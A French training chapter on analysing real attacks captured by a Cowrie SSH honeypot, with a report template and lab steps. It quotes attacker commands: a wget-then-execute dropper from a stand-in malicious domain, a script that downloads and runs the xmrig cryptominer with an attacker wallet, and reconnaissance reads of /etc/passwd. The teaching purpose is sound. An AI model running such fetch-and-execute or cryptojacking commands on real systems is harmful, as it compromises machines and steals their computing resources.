# CHAPITRE 09 – Étude de cas d’attaques réelles captées avec Cowrie

---

## 1. Objectifs pédagogiques

À l’issue de ce chapitre, l’apprenant sera capable de :

* Analyser des sessions d’attaques réelles enregistrées par Cowrie
* Identifier les techniques d’attaque utilisées
* Distinguer un comportement automatisé (bot/script) d’un humain
* Rédiger un rapport d’incident simple
* Proposer des mesures de défense à partir des données collectées

---

## 2. Typologies d’attaques observées

Voici les types d’attaques les plus fréquents détectés dans Cowrie :

| Type d’attaque         | Comportement typique                                                 |
| ---------------------- | -------------------------------------------------------------------- |
| Brute-force SSH        | Tentatives rapides et répétées de login (`root`, `admin`)            |
| Script automatisé      | Téléchargement + exécution de script `.sh` ou `.py`                  |
| Déploiement de malware | Téléchargement d’un binaire + chmod + ./                             |
| Cryptominer            | Exécution prolongée d’un `xmrig` ou `minerd`                         |
| Pivot réseau           | Tentatives d’accès à d’autres IP depuis le faux shell                |
| Humain (rare)          | Navigation lente, tentative de reconnaissance (`ls`, `cat`, `uname`) |

---

## 3. Étude de session : attaque brute-force + dropper

### 3.1. Événements captés

```json
{
  "eventid": "cowrie.login.success",
  "timestamp": "2025-07-04T10:33:12.520Z",
  "src_ip": "190.85.40.122",
  "username": "root",
  "password": "123456"
}
```

Commandes successives :

```text
wget http://malicious-domain.com/m.sh -O /tmp/m.sh
chmod +x /tmp/m.sh
/tmp/m.sh
```

Le script téléchargé :

```bash
#!/bin/bash
curl -O http://malicious-domain.com/xmrig
chmod +x xmrig
./xmrig --url miningpool.com --user attacker_wallet
```

### 3.2. Analyse

* Attaque automatisée
* Installation d’un mineur CPU (cryptojacking)
* L’IP 190.85.40.122 est répertoriée comme malveillante (AbuseIPDB : score 100)

---

## 4. Étude de session : humain curieux

### 4.1. Comportement observé

```text
uname -a
ls -la /etc
cat /etc/passwd
cd /var/log
cat auth.log
ping google.com
```

Aucune tentative de téléchargement.

### 4.2. Interprétation

* Démarche exploratoire
* Aucun script automatisé
* Probable test de pénétration ou attaquant en reconnaissance manuelle

---

## 5. Rejouer une session complète (replay)

Lister les fichiers tty :

```bash
ls log/tty/
```

Lire une session :

```bash
bin/playlog.py log/tty/ttylog.20250704-12123abc.log
```

---

## 6. Rapport d’incident simple

### Exemple de structure :

**Titre** : Détection d’une attaque de cryptojacking – IP 190.85.40.122
**Date** : 04/07/2025
**Résumé** : Connexion SSH réussie sur le port 2222, téléchargement d’un script de minage.
**IOCs** :

* IP : `190.85.40.122`
* URL : `http://malicious-domain.com/m.sh`
* Fichier : `xmrig`, hash SHA256 : `...`
  **Comportement** :
* Téléchargement automatique via `wget`
* Exécution d’un binaire
  **Réponse** :
* IP bannie (fail2ban)
* URL soumise à VirusTotal
* Hash partagé avec Suricata pour future détection

---

## 7. TP-09 : Analyse d’une attaque réelle dans Cowrie

### Objectif

Reproduire une analyse complète d’une session malveillante captée par Cowrie.

### Étapes

1. Choisir un fichier `ttylog/`
2. Rejouer la session :

```bash
bin/playlog.py log/tty/ttylog.YYYYMMDD-XXX.log
```

3. Identifier :

* IP source
* Commandes utilisées
* Fichier téléchargé

4. Extraire les IOC :

```bash
jq 'select(.session=="XXX") | .src_ip, .input, .url' log/cowrie.json
```

5. Rechercher l’IP dans AbuseIPDB et le hash dans VirusTotal

6. Rédiger un mini rapport `.md` ou `.pdf`

---

## 8. Questions de révision

1. Comment faire la différence entre un bot et un humain dans une session ?
2. Quels éléments permettent d’identifier un cryptominer ?
3. Quelle information utile trouve-t-on dans `cowrie.session.file_download` ?
4. Pourquoi analyser un `ttylog` peut être plus riche que lire le `.json` ?
5. Quels indicateurs doivent être extraits pour générer un rapport d’incident ?

---

## 9. Ressources

* [https://www.abuseipdb.com/](https://www.abuseipdb.com/)
* [https://www.virustotal.com/](https://www.virustotal.com/)
* Cowrie replay script : `bin/playlog.py`
* Format JSON Events : [https://cowrie.readthedocs.io](https://cowrie.readthedocs.io)
